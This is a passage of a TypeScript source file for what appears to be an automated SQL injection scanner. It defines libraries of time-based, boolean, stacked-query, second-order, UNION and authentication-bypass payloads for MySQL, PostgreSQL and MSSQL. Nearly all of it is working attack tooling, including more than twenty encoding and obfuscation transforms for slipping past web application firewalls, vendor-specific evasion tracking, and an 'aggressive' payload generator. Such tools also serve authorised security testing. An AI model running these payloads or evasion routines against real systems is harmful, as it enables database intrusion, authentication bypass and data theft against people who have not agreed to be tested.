        databases: ["postgresql"],
        description: `PostgreSQL stacked pg_sleep ${delay}s`,
        riskLevel: "high",
        expectedBehavior: `${delay}s delay`
      });

      timePayloads.push({
        category: "time_based",
        template: `'||(SELECT ''||pg_sleep(${delay}))||'`,
        databases: ["postgresql"],
        description: `PostgreSQL concatenation pg_sleep ${delay}s`,
        riskLevel: "medium",
        expectedBehavior: `${delay}s delay`
      });

      timePayloads.push({
        category: "time_based",
        template: `'; WAITFOR DELAY '0:0:${delay}';--`,
        databases: ["mssql"],
        description: `MSSQL WAITFOR DELAY ${delay}s`,
        riskLevel: "high",
        expectedBehavior: `${delay}s delay`
      });

      timePayloads.push({
        category: "time_based",
        template: `' AND 1=(SELECT 1 FROM (SELECT SLEEP(${delay}))x)--`,
        databases: ["mysql"],
        description: `MySQL conditional SLEEP ${delay}s`,
        riskLevel: "medium",
        expectedBehavior: `${delay}s delay`
      });

      timePayloads.push({
        category: "time_based",
        template: `' AND 1=1 AND pg_sleep(${delay}) IS NOT NULL--`,
        databases: ["postgresql"],
        description: `PostgreSQL conditional pg_sleep ${delay}s`,
        riskLevel: "medium",
        expectedBehavior: `${delay}s delay`
      });
    }

    timePayloads.push({
      category: "time_based",
      template: "' AND BENCHMARK(10000000,SHA1('test'))--",
      databases: ["mysql"],
      description: "MySQL BENCHMARK heavy computation delay",
      riskLevel: "high",
      expectedBehavior: "Computation-based delay"
    });

    timePayloads.push({
      category: "time_based",
      template: "' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)--",
      databases: ["mysql"],
      description: "MySQL heavy query delay",
      riskLevel: "high",
      expectedBehavior: "Query-based delay"
    });

    timePayloads.forEach((p, i) => {
      this.payloads.push({ ...p, id: `time_${i + 1}` });
    });
  }

  private initializeBooleanBasedSuite(): void {
    const booleanPayloads: Omit<Payload, "id">[] = [
      { category: "boolean_based", template: "' AND 1=1--", databases: ["generic"], description: "Boolean true condition", riskLevel: "low", expectedBehavior: "Same as original" },
      { category: "boolean_based", template: "' AND 1=2--", databases: ["generic"], description: "Boolean false condition", riskLevel: "low", expectedBehavior: "Different from original" },
      { category: "boolean_based", template: "' AND 'a'='a'--", databases: ["generic"], description: "String equality true", riskLevel: "low", expectedBehavior: "Same as original" },
      { category: "boolean_based", template: "' AND 'a'='b'--", databases: ["generic"], description: "String equality false", riskLevel: "low", expectedBehavior: "Different from original" },
      { category: "boolean_based", template: "' AND SUBSTRING('abc',1,1)='a'--", databases: ["generic"], description: "SUBSTRING true condition", riskLevel: "medium", expectedBehavior: "Same as original" },
      { category: "boolean_based", template: "' AND SUBSTRING('abc',1,1)='b'--", databases: ["generic"], description: "SUBSTRING false condition", riskLevel: "medium", expectedBehavior: "Different from original" },
      { category: "boolean_based", template: "' AND ASCII(SUBSTRING(database(),1,1))>64--", databases: ["mysql"], description: "MySQL binary search probe", riskLevel: "medium", expectedBehavior: "Binary search response" },
      { category: "boolean_based", template: "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--", databases: ["mysql"], description: "MySQL table count probe", riskLevel: "medium", expectedBehavior: "True condition" },
      { category: "boolean_based", template: "' AND LENGTH(database())>0--", databases: ["mysql"], description: "MySQL database length probe", riskLevel: "medium", expectedBehavior: "True condition" },
      { category: "boolean_based", template: "' AND (SELECT 1)=1--", databases: ["generic"], description: "Subquery boolean true", riskLevel: "low", expectedBehavior: "Same as original" },
      { category: "boolean_based", template: "' AND (SELECT 1)=0--", databases: ["generic"], description: "Subquery boolean false", riskLevel: "low", expectedBehavior: "Different from original" },
      { category: "boolean_based", template: "1 AND 1=1", databases: ["generic"], description: "Numeric boolean true", riskLevel: "low", expectedBehavior: "Same as original" },
      { category: "boolean_based", template: "1 AND 1=2", databases: ["generic"], description: "Numeric boolean false", riskLevel: "low", expectedBehavior: "Different from original" },
    ];

    booleanPayloads.forEach((p, i) => {
      this.payloads.push({ ...p, id: `boolean_${i + 1}` });
    });
  }

  private initializeStackedQuerySuite(): void {
    const stackedPayloads: Omit<Payload, "id">[] = [
      { category: "stacked_query", template: "'; SELECT 1;--", databases: ["generic"], description: "Simple stacked SELECT", riskLevel: "high", expectedBehavior: "Multi-query execution" },
      { category: "stacked_query", template: "'; SELECT @@version;--", databases: ["mysql", "mssql"], description: "Stacked version query", riskLevel: "high", expectedBehavior: "Version disclosure" },
      { category: "stacked_query", template: "'; SELECT version();--", databases: ["postgresql"], description: "PostgreSQL stacked version", riskLevel: "high", expectedBehavior: "Version disclosure" },
      { category: "stacked_query", template: "'; INSERT INTO temp VALUES(1);--", databases: ["generic"], description: "Stacked INSERT probe", riskLevel: "high", expectedBehavior: "Data insertion" },
      { category: "stacked_query", template: "'; UPDATE users SET password='x' WHERE 1=0;--", databases: ["generic"], description: "Stacked UPDATE probe (safe)", riskLevel: "high", expectedBehavior: "Update execution" },
      { category: "stacked_query", template: "'; DECLARE @x int; SET @x=1;--", databases: ["mssql"], description: "MSSQL variable declaration", riskLevel: "high", expectedBehavior: "Variable execution" },
      { category: "stacked_query", template: "'; DO $$BEGIN PERFORM pg_sleep(1); END$$;--", databases: ["postgresql"], description: "PostgreSQL DO block", riskLevel: "high", expectedBehavior: "Block execution" },
    ];

    stackedPayloads.forEach((p, i) => {
      this.payloads.push({ ...p, id: `stacked_${i + 1}` });
    });
  }

  private initializeSecondOrderSuite(): void {
    const secondOrderPayloads: Omit<Payload, "id">[] = [
      { category: "second_order", template: "' OR '1'='1", databases: ["generic"], description: "Second-order OR bypass (stored)", riskLevel: "high", expectedBehavior: "Stored payload trigger" },
      { category: "second_order", template: "admin'--", databases: ["generic"], description: "Second-order admin bypass (stored)", riskLevel: "high", expectedBehavior: "Stored payload trigger" },
      { category: "second_order", template: "test@test.com' OR '1'='1", databases: ["generic"], description: "Second-order email field bypass", riskLevel: "high", expectedBehavior: "Stored payload trigger" },
      { category: "second_order", template: "John' OR '1'='1' --", databases: ["generic"], description: "Second-order name field bypass", riskLevel: "high", expectedBehavior: "Stored payload trigger" },
    ];

    secondOrderPayloads.forEach((p, i) => {
      this.payloads.push({ ...p, id: `second_order_${i + 1}` });
    });
  }

  private initializeTampingStrategies(): void {
    this.tampingStrategies = [
      {
        name: "space_to_comment",
        description: "Replace spaces with inline comments",
        transform: (payload: string) => payload.replace(/ /g, "/**/")
      },
      {
        name: "space_to_plus",
        description: "Replace spaces with plus signs",
        transform: (payload: string) => payload.replace(/ /g, "+")
      },
      {
        name: "space_to_tab",
        description: "Replace spaces with tabs",
        transform: (payload: string) => payload.replace(/ /g, "\t")
      },
      {
        name: "space_to_newline",
        description: "Replace spaces with newlines",
        transform: (payload: string) => payload.replace(/ /g, "\n")
      },
      {
        name: "case_variation",
        description: "Randomize keyword case",
        transform: (payload: string) => {
          const keywords = ["SELECT", "UNION", "AND", "OR", "FROM", "WHERE", "ORDER", "BY", "NULL", "SLEEP", "WAITFOR", "DELAY"];
          let result = payload;
          keywords.forEach(kw => {
            const regex = new RegExp(`\\b${kw}\\b`, "gi");
            result = result.replace(regex, (match) => {
              return match.split("").map((c, i) => i % 2 === 0 ? c.toLowerCase() : c.toUpperCase()).join("");
            });
          });
          return result;
        }
      },
      {
        name: "double_url_encode",
        description: "Double URL encode special characters",
        transform: (payload: string) => {
          return payload
            .replace(/'/g, "%2527")
            .replace(/"/g, "%2522")
            .replace(/ /g, "%2520")
            .replace(/=/g, "%253D");
        }
      },
      {
        name: "hex_encode",
        description: "Hex encode strings",
        transform: (payload: string) => {
          return payload.replace(/'([^']+)'/g, (match, p1) => {
            const hex = Buffer.from(p1).toString("hex");
            return `0x${hex}`;
          });
        }
      },
      {
        name: "char_encode_mysql",
        description: "Use MySQL CHAR() function",
        transform: (payload: string) => {
          return payload.replace(/'([^']+)'/g, (match, p1) => {
            const chars = p1.split("").map((c: string) => c.charCodeAt(0)).join(",");
            return `CHAR(${chars})`;
          });
        }
      },
      {
        name: "concat_split",
        description: "Split strings with concatenation",
        transform: (payload: string) => {
          return payload.replace(/'([^']{2,})'/g, (match, p1) => {
            if (p1.length <= 2) return match;
            const mid = Math.floor(p1.length / 2);
            return `'${p1.substring(0, mid)}'||'${p1.substring(mid)}'`;
          });
        }
      },
      {
        name: "null_byte_prefix",
        description: "Add null byte prefix",
        transform: (payload: string) => `%00${payload}`
      },
      {
        name: "newline_injection",
        description: "Inject newlines before SQL keywords",
        transform: (payload: string) => {
          const keywords = ["SELECT", "UNION", "AND", "OR", "FROM", "WHERE"];
          let result = payload;
          keywords.forEach(kw => {
            const regex = new RegExp(`\\b${kw}\\b`, "gi");
            result = result.replace(regex, `\n${kw}`);
          });
          return result;
        }
      },
      {
        name: "scientific_notation",
        description: "Use scientific notation for numbers",
        transform: (payload: string) => payload.replace(/\b1\b/g, "1e0").replace(/\b0\b/g, "0e0")
      },
      {
        name: "mysql_version_comment",
        description: "Use MySQL version-specific comments",
        transform: (payload: string) => {
          const keywords = ["UNION", "SELECT", "AND", "OR"];
          let result = payload;
          keywords.forEach(kw => {
            const regex = new RegExp(`\\b${kw}\\b`, "gi");
            result = result.replace(regex, `/*!50000${kw}*/`);
          });
          return result;
        }
      },
      {
        name: "bracket_spacing",
        description: "Add brackets around keywords",
        transform: (payload: string) => {
          return payload
            .replace(/SELECT/gi, "(SELECT)")
            .replace(/UNION/gi, "(UNION)")
            .replace(/AND/gi, "(AND)")
            .replace(/OR/gi, "(OR)");
        }
      },
      {
        name: "html_entity_encode",
        description: "HTML entity encode special chars",
        transform: (payload: string) => {
          return payload
            .replace(/'/g, "&#39;")
            .replace(/"/g, "&#34;")
            .replace(/</g, "&lt;")
            .replace(/>/g, "&gt;");
        }
      },
      {
        name: "unicode",
        description: "Unicode encoding for SQL keywords",
        transform: (payload: string) => {
          const keywords = ["SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "DROP", "OR", "AND", "WHERE", "FROM"];
          let result = payload;
          keywords.forEach(kw => {
            const regex = new RegExp(`\\b${kw}\\b`, "gi");
            result = result.replace(regex, (match) => {
              return match.split("").map(char => `%u00${char.charCodeAt(0).toString(16).padStart(2, "0")}`).join("");
            });
          });
          return result;
        }
      },
      {
        name: "double_encode",
        description: "Double URL encode payload",
        transform: (payload: string) => encodeURIComponent(encodeURIComponent(payload))
      },
      {
        name: "comment_split",
        description: "Split keywords with inline comments",
        transform: (payload: string) => {
          const keywords = ["SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "DROP", "WHERE", "FROM", "AND", "OR"];
          let result = payload;
          keywords.forEach(kw => {
            const regex = new RegExp(`\\b${kw}\\b`, "gi");
            result = result.replace(regex, (match) => {
              if (match.length <= 2) return match;
              const midpoint = Math.floor(match.length / 2);
              return match.slice(0, midpoint) + "/**/" + match.slice(midpoint);
            });
          });
          return result;
        }
      },
      {
        name: "case_folding",
        description: "Alternating case for keywords",
        transform: (payload: string) => {
          const keywords = ["SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "DROP", "WHERE", "FROM", "AND", "OR"];
          let result = payload;
          keywords.forEach(kw => {
            const regex = new RegExp(`\\b${kw}\\b`, "gi");
            result = result.replace(regex, () => {
              return kw.split("").map((char, i) => i % 2 === 0 ? char.toLowerCase() : char.toUpperCase()).join("");
            });
          });
          return result;
        }
      },
      {
        name: "null_byte",
        description: "Insert %00 between SQL keywords",
        transform: (payload: string) => {
          const keywords = ["SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "DROP", "WHERE", "FROM", "AND", "OR"];
          let result = payload;
          keywords.forEach(kw => {
            const regex = new RegExp(`\\b${kw}\\b`, "gi");
            result = result.replace(regex, (match) => {
              return match.split("").join("%00");
            });
          });
          return result;
        }
      },
      {
        name: "space_replacement",
        description: "Replace spaces with various alternatives",
        transform: (payload: string) => {
          const replacements = ["/**/", "%09", "%0A", "%0D", "+"];
          let result = payload;
          let idx = 0;
          result = result.replace(/ /g, () => {
            const replacement = replacements[idx % replacements.length];
            idx++;
            return replacement;
          });
          return result;
        }
      },
      {
        name: "chunk_encoding",
        description: "Split payload into chunked format",
        transform: (payload: string) => {
          const chunkSize = 4;
          const chunks: string[] = [];
          for (let i = 0; i < payload.length; i += chunkSize) {
            const chunk = payload.slice(i, i + chunkSize);
            chunks.push(encodeURIComponent(chunk));
          }
          return chunks.join("%20");
        }
      },
      {
        name: "wildcard_insert",
        description: "MySQL wildcard insertion (S%ELECT style)",
        transform: (payload: string) => {
          const keywords = ["SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "DROP", "WHERE", "FROM"];
          let result = payload;
          keywords.forEach(kw => {
            const regex = new RegExp(`\\b${kw}\\b`, "gi");
            result = result.replace(regex, (match) => {
              if (match.length <= 2) return match;
              return match.charAt(0) + "%" + match.slice(1);
            });
          });
          return result;
        }
      },
      {
        name: "version_comment",
        description: "MySQL version comments (/*!50000SELECT*/)",
        transform: (payload: string) => {
          const keywords = ["SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "DROP", "AND", "OR", "WHERE", "FROM"];
          let result = payload;
          keywords.forEach(kw => {
            const regex = new RegExp(`\\b${kw}\\b`, "gi");
            result = result.replace(regex, `/*!50000${kw}*/`);
          });
          return result;
        }
      },
    ];
  }

  public getAllPayloads(): Payload[] {
    return [...this.payloads];
  }
  
  public getTotalPayloadCount(): number {
    return this.payloads.length;
  }
  
  public calculateTotalPayloadsForParams(paramCount: number): { total: number; breakdown: Record<string, number> } {
    const breakdown: Record<string, number> = {};
    let total = 0;
    
    // Count payloads by category
    for (const payload of this.payloads) {
      breakdown[payload.category] = (breakdown[payload.category] || 0) + 1;
    }
    
    // Total = payloads per param * params * tamping strategies
    const tampingMultiplier = this.tampingStrategies.length + 1; // +1 for original
    total = this.payloads.length * paramCount * tampingMultiplier;
    
    return { total, breakdown };
  }

  public getPayloadsByCategory(category: PayloadCategory): Payload[] {
    return this.payloads.filter(p => p.category === category);
  }

  public getPayloadsForDatabase(database: DatabaseType): Payload[] {
    return this.payloads.filter(p => 
      p.databases.includes(database) || p.databases.includes("generic")
    );
  }

  public getPayloadsByCategoryAndDatabase(category: PayloadCategory, database: DatabaseType): Payload[] {
    return this.payloads.filter(p => 
      p.category === category && 
      (p.databases.includes(database) || p.databases.includes("generic"))
    );
  }

  public getTampingStrategies(): TampingStrategy[] {
    return [...this.tampingStrategies];
  }

  public applyTamping(payload: string, strategyName: string): string {
    const strategy = this.tampingStrategies.find(s => s.name === strategyName);
    if (!strategy) return payload;
    return strategy.transform(payload);
  }

  public applyAllTamping(payload: string): string[] {
    return this.tampingStrategies.map(s => s.transform(payload));
  }

  public applyRandomTamping(payload: string, count: number = 3): string[] {
    const shuffled = [...this.tampingStrategies].sort(() => Math.random() - 0.5);
    const selected = shuffled.slice(0, Math.min(count, shuffled.length));
    return selected.map(s => s.transform(payload));
  }

  public applyDynamicTamping(payload: string, strategyNames: TampingStrategyName[]): string {
    let result = payload;
    for (const strategyName of strategyNames) {
      const strategy = this.tampingStrategies.find(s => s.name === strategyName);
      if (strategy) {
        result = strategy.transform(result);
      }
    }
    return result;
  }

  public getDynamicTamping(wafVendor: string, attemptNumber: number): TampingStrategyName[] {
    return dynamicTampingTracker.getDynamicTamping(wafVendor, attemptNumber);
  }

  public getWAFTampingProfile(wafVendor: string): WAFTampingProfile {
    const normalizedVendor = wafVendor.toLowerCase().replace(/[^a-z0-9_]/g, "_");
    return WAF_TAMPING_PROFILES[normalizedVendor] || WAF_TAMPING_PROFILES.generic;
  }

  public recordWAFBlock(wafVendor: string): void {
    dynamicTampingTracker.recordBlock(wafVendor);
  }

  public recordWAFSuccess(wafVendor: string): void {
    dynamicTampingTracker.recordSuccess(wafVendor);
  }

  public getTampingState(wafVendor: string): DynamicTampingState | undefined {
    return dynamicTampingTracker.getState(wafVendor);
  }

  public generateUnionPayloads(minColumns: number, maxColumns: number): string[] {
    const payloads: string[] = [];
    for (let cols = minColumns; cols <= maxColumns; cols++) {
      const nulls = Array(cols).fill("NULL").join(",");
      payloads.push(`' UNION SELECT ${nulls}--`);
      payloads.push(`' UNION ALL SELECT ${nulls}--`);
      payloads.push(`') UNION SELECT ${nulls}--`);
      payloads.push(`')) UNION SELECT ${nulls}--`);
    }
    return payloads;
  }

  public getPayloadCount(): number {
    return this.payloads.length;
  }

  public getCategoryStats(): Record<PayloadCategory, number> {
    const stats: Record<string, number> = {};
    this.payloads.forEach(p => {
      stats[p.category] = (stats[p.category] || 0) + 1;
    });
    return stats as Record<PayloadCategory, number>;
  }

  public getVerboseErrorPayloads(database?: DatabaseType): Payload[] {
    return this.payloads.filter(p => 
      p.category === "verbose_error" && 
      (database ? p.databases.includes(database) || p.databases.includes("generic") : true)
    );
  }

  public getContextAwarePayloads(context: ContextAnalysis, category: PayloadCategory): string[] {
    const basePayloads = this.getPayloadsByCategory(category);
    const prefixes = ContextAnalyzer.generateContextAwarePrefixes(context);
    const result: string[] = [];
    
    for (const payload of basePayloads) {
      const template = payload.template;
      
      if (context.isNumeric && template.startsWith("'")) {
        const numericVariant = template.replace(/^'/, "1 ").replace(/' /, " ");
        result.push(numericVariant);
        for (const prefix of prefixes.slice(0, 3)) {
          if (prefix && !prefix.includes("'")) {
            result.push(`${prefix}${numericVariant.substring(2)}`);
          }
        }
      } else if (context.type === "double_quote" && template.startsWith("'")) {
        const doubleQuoteVariant = template.replace(/'/g, '"');
        result.push(doubleQuoteVariant);
        for (const prefix of prefixes.slice(0, 3)) {
          if (prefix) {
            result.push(`${prefix}${doubleQuoteVariant.substring(1)}`);
          }
        }
      } else if (context.parenthesesDepth > 0 && !template.includes(")")) {
        const closures = context.isNumeric ? [")", "))", ")))"] : ["')", "'))", "')))", "')--"];
        for (const closure of closures) {
          result.push(`${closure}${template.replace(/^'/, " ")}`);
        }
      } else {
        result.push(template);
        for (const closure of context.closures.slice(0, 3)) {
          if (closure && !template.startsWith(closure)) {
            result.push(`${closure}${template.substring(1)}`);
          }
        }
      }
    }
    
    return Array.from(new Set(result));
  }

  public applyHexEncodingToHighRisk(payloads: string[]): string[] {
    const hexEncoded: string[] = [];
    const hexStrategy = this.tampingStrategies.find(s => s.name === "hex_encode");
    
    for (const payload of payloads) {
      hexEncoded.push(payload);
      if (hexStrategy) {
        const encoded = hexStrategy.transform(payload);
        if (encoded !== payload) {
          hexEncoded.push(encoded);
        }
      }
    }
    
    return hexEncoded;
  }

  public applyDoubleUrlEncodingToHighRisk(payloads: string[]): string[] {
    const doubleEncoded: string[] = [];
    const doubleUrlStrategy = this.tampingStrategies.find(s => s.name === "double_url_encode");
    
    for (const payload of payloads) {
      doubleEncoded.push(payload);
      if (doubleUrlStrategy) {
        doubleEncoded.push(doubleUrlStrategy.transform(payload));
      }
    }
    
    return doubleEncoded;
  }

  public getHeavyPayloads(database?: DatabaseType): Payload[] {
    return this.payloads.filter(p => 
      p.riskLevel === "high" && 
      (database ? p.databases.includes(database) || p.databases.includes("generic") : true)
    );
  }

  public generateAggressivePayloadSuite(context: ContextAnalysis, database?: DatabaseType): string[] {
    const suite: string[] = [];
    
    const errorPayloads = this.getPayloadsByCategory("error_based").map(p => p.template);
    const verbosePayloads = this.getVerboseErrorPayloads(database).map(p => p.template);
    const authPayloads = this.getPayloadsByCategory("auth_bypass").map(p => p.template);
    
    const allPayloads = [...errorPayloads, ...verbosePayloads, ...authPayloads];
    
    const contextAware = this.getContextAwarePayloads(context, "error_based");
    suite.push(...contextAware);
    
    suite.push(...allPayloads);
    
    const withHex = this.applyHexEncodingToHighRisk(allPayloads.slice(0, 50));
    suite.push(...withHex);
    
    const withDoubleUrl = this.applyDoubleUrlEncodingToHighRisk(allPayloads.slice(0, 50));
    suite.push(...withDoubleUrl);
    
    return Array.from(new Set(suite));
  }
}

export const globalPayloadRepository = new GlobalPayloadRepository();
